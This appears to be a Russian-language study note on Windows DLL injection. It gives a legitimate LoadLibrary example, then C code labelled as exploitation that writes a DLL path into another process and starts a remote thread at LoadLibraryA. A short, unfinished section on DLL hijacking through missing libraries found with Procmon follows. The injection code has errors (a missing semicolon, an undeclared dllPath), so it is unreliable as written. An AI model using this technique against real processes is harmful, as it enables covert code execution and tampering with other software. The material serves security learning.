#windows #attacks #dll

> `DLL injection`Это метод, который включает в себя внедрение фрагмента кода, структурированного в виде динамически подключаемой библиотеки (DLL), в запущенный процесс. Этот метод позволяет внедренному коду выполняться в контексте процесса, тем самым влияя на его поведение или получая доступ к его ресурсам.

# Техники DLL Injection

## Оглавление
- [[#1) LoadLibrary]]
- [[#2) Invalid Libraries]]

---

## 1) LoadLibrary

LoadLibrary Это широко используемый метод внедрения DLL-библиотек, применяющий LoadLibrary API для загрузки DLL в адресное пространство целевого процесса.

 LoadLibrary API — это функция, предоставляемая операционной системой Windows, которая загружает динамически подключаемую библиотеку (DLL) в память текущего процесса и возвращает дескриптор, который можно использовать для получения адресов функций внутри DLL.
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```
Легитимное использование 

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```
Эксплуатация


## 2) Invalid Libraries

Ещё один способ осуществить атаку с перехватом DLL — заменить допустимую библиотеку, которую программа пытается загрузить, но не может найти, на специально созданную библиотеку

Если мы изменим фильтр Procmon, чтобы он фокусировался на записях, путь к которым заканчивается на `.dll`и имеет статус `NAME NOT FOUND`Мы можем найти такие библиотеки в `main.exe`


